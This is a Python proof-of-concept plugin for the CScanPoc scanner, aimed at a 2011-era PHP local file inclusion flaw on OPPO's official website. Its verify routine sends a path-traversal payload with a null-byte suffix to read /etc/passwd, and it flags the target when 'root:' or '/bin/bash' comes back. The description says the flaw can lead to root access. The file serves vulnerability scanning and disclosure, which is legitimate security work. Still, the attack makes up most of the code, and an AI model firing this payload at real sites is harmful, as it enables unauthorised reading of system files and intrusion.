# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Oppo_0101' # 平台漏洞编号
    name = 'OPPO官网PHP文件包含' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2011-04-01'  # 漏洞公布时间
    desc = '''模版漏洞描述
    OPPO官网的PHP站点，存在大量的PHP文件包含漏洞，可以利用拿到root。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=1466
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Oppo'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3497e740-fce7-4d67-ae0b-84f1f0a39e84' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/index.php?q=mobile/product/newtpl&name=../../../../../../../../etc/passwd%00&tpl=index"
            url = self.target + payload
            response = requests.get(url)
            if 'root:' in response.text or "/bin/bash" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
